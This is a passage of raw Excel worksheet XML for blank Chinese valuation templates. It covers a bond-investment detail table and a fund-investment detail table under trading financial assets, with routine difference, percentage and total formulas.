      <c r="M29" s="576" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="L3:M3"/>
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B1:M1"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:M29">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)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7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Sheet16">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.5" customWidth="1" style="410" min="2" max="2"/>
    <col width="18.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="9" customWidth="1" style="410" min="4" max="4"/>
    <col width="10.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="10" customWidth="1" style="410" min="6" max="6"/>
    <col width="9" customWidth="1" style="410" min="7" max="7"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="13" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="12.5" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="11.3333333333333" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="10.5" customWidth="1" style="410" min="12" max="12"/>
    <col width="7.66666666666667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交易性金融资产—债券投资评估明细表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402" t="inlineStr">
        <is>
          <t>表3-2-2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176" t="n"/>
      <c r="M4" s="176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被投资单位名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>债券名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发行日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>投资日期</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>票面利率%</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>成本</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>账面价值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Height="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="578" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-I6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(I6=0,"",K6/I6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="578" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-I7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(I7=0,"",K7/I7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="578" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-I8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(I8=0,"",K8/I8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="578" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-I9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(I9=0,"",K9/I9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="578" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-I10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(I10=0,"",K10/I10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="578" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-I11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(I11=0,"",K11/I11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="578" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-I12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(I12=0,"",K12/I12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="578" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-I13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(I13=0,"",K13/I13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="578" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-I14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(I14=0,"",K14/I14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="578" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-I15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(I15=0,"",K15/I15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="578" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-I16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(I16=0,"",K16/I16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="578" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-I17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(I17=0,"",K17/I17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="578" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-I18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(I18=0,"",K18/I18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="578" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-I19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(I19=0,"",K19/I19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="578" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-I20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(I20=0,"",K20/I20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="578" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-I21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(I21=0,"",K21/I21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="578" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-I22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(I22=0,"",K22/I22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="578" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-I23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(I23=0,"",K23/I23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="578" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-I24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(I24=0,"",K24/I24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="578" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-I25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(I25=0,"",K25/I25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="578" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>J26-I26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(I26=0,"",K26/I26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="578" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-I27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(I27=0,"",K27/I27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="578" t="n"/>
      <c r="F28" s="578" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>J28-I28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(I28=0,"",K28/I28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合          计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="383" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="115" t="n"/>
      <c r="G29" s="383" t="n"/>
      <c r="H29" s="579" t="n"/>
      <c r="I29" s="555">
        <f>ROUND(SUM(I6:I28),2)</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>ROUND(SUM(J6:J28),2)</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>J29-I29</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>IF(I29=0,"",K29/I29*100)</f>
        <v/>
      </c>
      <c r="M29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="L3:M3"/>
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B1:M1"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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7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codeName="Sheet17">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M31"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A30"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.3333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.8333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="12" customWidth="1" style="410" min="6" max="6"/>
    <col width="13.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="14.5" customWidth="1" style="410" min="8" max="8"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="12.1666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="8.16666666666667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交易性金融资产—基金投资评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="14" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="14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402" t="inlineStr">
        <is>
          <t>表3-2-3</t>
        </is>
      </c>
    </row>
    <row r="4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176" t="n"/>
      <c r="M4" s="176">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" customForma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基金发行单位</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>基金名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>基金类型</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>投资日期</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>成本</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>基准日净值/份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s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="578" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="580" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-H6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(H6=0,"",K6/H6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="578" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="580" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-H7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(H7=0,"",K7/H7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="578" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="580" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-H8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(H8=0,"",K8/H8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="578" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="580" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-H9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(H9=0,"",K9/H9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="578" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="580" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-H10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(H10=0,"",K10/H10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="581" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="580" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-H11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(H11=0,"",K11/H11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="581" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="580" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-H12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(H12=0,"",K12/H12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="581" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="580" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-H13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(H13=0,"",K13/H13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="581" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="580" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-H14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(H14=0,"",K14/H14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="581" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="580" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-H15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(H15=0,"",K15/H15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="581" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="580" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-H16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(H16=0,"",K16/H16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="581" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="580" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-H17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(H17=0,"",K17/H17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="581" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="580" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-H18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(H18=0,"",K18/H18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="581" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="580" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-H19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(H19=0,"",K19/H19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="578" t="n"/>
